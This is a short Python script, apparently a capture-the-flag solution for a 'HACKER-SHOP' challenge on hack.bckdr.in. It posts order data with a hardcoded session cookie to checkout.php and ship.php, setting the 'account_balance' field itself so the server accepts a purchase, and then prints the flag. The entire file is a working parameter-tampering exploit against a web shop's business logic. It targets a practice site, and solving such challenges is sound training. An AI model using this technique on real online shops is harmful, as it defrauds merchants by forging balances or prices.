import requests
#a tricky question.Post request parameters can be changed!

cookie={'PHPSESSID':'15bmgbl84ha3q8msecivbtrpd4'}
#making post request at checkout.php with all required parameters and then at ship.php

checkout=requests.post("http://hack.bckdr.in/HACKER-SHOP/checkout.php",cookies=cookie,
	data={

	'name':"aniket",
	'address':"anything",
	'email':"abc@gmail.com",
	'mobile':"8888888888",
	'account_balance':1000,
	'product_id':2

	}
	)
shippage=requests.post("http://hack.bckdr.in/HACKER-SHOP/ship.php",cookies=cookie,
	data={

	'name':"aniket",
	'address':"anything",
	'email':"abc@gmail.com",
	'mobile':"8888888888",
	'account_balance':1000,
	'product_id':2

	}
	)
#printing responce and hence the flag.
print(shippage.text)
#Go get yours,the hackforce is with you.